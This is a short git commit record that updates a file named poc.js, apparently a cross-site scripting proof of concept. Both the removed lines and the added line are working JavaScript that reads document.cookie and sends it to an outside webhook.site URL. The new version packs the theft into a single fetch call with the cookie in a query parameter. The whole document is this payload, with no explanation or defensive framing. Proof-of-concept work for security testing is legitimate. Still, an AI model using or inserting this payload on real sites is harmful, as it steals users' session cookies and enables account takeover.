9148d869786345e62d7ec8d3c5bb602aa1e9fa73
msc-trash <michaelschouwenaar@outlook.com>
2026-05-12 15:31:24 +0200

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,9 +1,1 @@
-var webhook = "https://webhook.site/04d732b9-ea06-4d98-97c9-7d9551251e73"
-
-fetch(webhook, 
-  {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify(document.cookie),
-  }
-)
+fetch("https://webhook.site/04d732b9-ea06-4d98-97c9-7d9551251e73?secret=" + JSON.stringify(document.cookie));
